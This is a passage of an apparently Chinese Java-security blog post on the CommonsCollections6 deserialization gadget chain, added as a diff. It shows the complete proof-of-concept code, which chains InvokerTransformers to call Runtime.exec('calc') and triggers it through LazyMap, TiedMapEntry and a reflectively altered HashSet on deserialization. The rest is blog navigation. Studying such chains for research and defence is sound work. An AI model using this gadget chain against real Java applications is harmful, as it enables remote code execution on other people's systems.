+import java.util.HashMap;
+import java.util.HashSet;
+
+
+public class CC6 &#123;
+    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException, IOException &#123;
+
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+
+        TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);
+        HashSet hashSet = new HashSet(1);
+        hashSet.add(&quot;T0dis&quot;);
+        Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+        HashSet_map.setAccessible(true);
+        HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);
+        Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+
+        table.setAccessible(true);
+
+        Object[] hashMapTable = (Object[]) table.get(hashSetMap);
+
+        Object node = hashMapTable[0];
+        if(node == null) &#123;
+            node = hashMapTable[1];
+        &#125;
+
+        Field key =  node.getClass().getDeclaredField(&quot;key&quot;);
+        key.setAccessible(true);
+        key.set(node, tiedmap);
+
+        serialize(hashSet);
+        unserialize(&quot;ser.bin&quot;);
+
+    &#125;
+
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    &#125;
+
+
+&#125;
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/06/CommonsCollections6/">http://example.com/2023/04/06/CommonsCollections6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fastjson漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CommonCollections1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div><div><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">Fastjson漏洞分析</div></div></a></div><div><a href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="JNDI注入学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303212056761.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">JNDI注入学习</div></div></a></div><div><a href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java代理与动态代理"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-02</div><div class="title">Java代理与动态代理</div></div></a></div><div><a href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img class="cover" src="https://su18.org/post-images/memory-shell.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-18</div><div class="title">Java内存马</div></div></a></div><div><a href="/2023/03/16/Java%E5%8F%8D%E5%B0%84/" title="Java反射"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303162204108.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-16</div><div class="title">Java反射</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections6"><span class="toc-number">1.</span> <span class="toc-text">CommonsCollections6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">利用链的限制条件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">利用链：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC"><span class="toc-number">1.5.</span> <span class="toc-text">最终POC</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img src="https://su18.org/post-images/memory-shell.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java内存马"/></a><div class="content"><a class="title" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">Java内存马</a><time datetime="2023-04-18T12:22:14.000Z" title="发表于 2023-04-18 20:22:14">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/202304161714754.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Shiro反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a><time datetime="2023-04-11T05:03:59.000Z" title="发表于 2023-04-11 13:03:59">2023-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Fastjson漏洞分析"/></a><div class="content"><a class="title" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析">Fastjson漏洞分析</a><time datetime="2023-04-08T07:19:37.000Z" title="发表于 2023-04-08 15:19:37">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsCollections6"/></a><div class="content"><a class="title" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6">CommonsCollections6</a><time datetime="2023-04-06T06:19:07.000Z" title="发表于 2023-04-06 14:19:07">2023-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonCollections1"/></a><div class="content"><a class="title" href="/2023/04/04/CommonCollections1/" title="CommonCollections1">CommonCollections1</a><time datetime="2023-04-04T07:10:57.000Z" title="发表于 2023-04-04 15:10:57">2023-04-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
